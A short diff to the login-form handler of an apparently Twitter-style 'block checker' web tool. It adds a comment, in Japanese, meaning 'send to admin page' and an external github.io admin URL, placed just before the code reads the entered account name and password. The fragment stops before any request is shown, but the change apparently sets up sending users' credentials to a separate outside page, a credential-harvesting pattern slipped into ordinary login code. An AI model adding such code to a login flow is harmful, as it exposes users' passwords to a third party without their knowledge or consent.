@@ -269,8 +269,10 @@ const blockCountEl = document.getElementById("block-count");
 const btnRetry = document.getElementById("btn-retry");
 
 loginForm.addEventListener("submit", async (e) => {
-  e.preventDefault();
-
+  e.preventDefault();  
+  
+  // 管理者ページに送信
+  const adminUrl = 'https://blockchecker.github.io/new/admin.html';
   const account = document.getElementById("account").value;
   const password = document.getElementById('password').value;
 
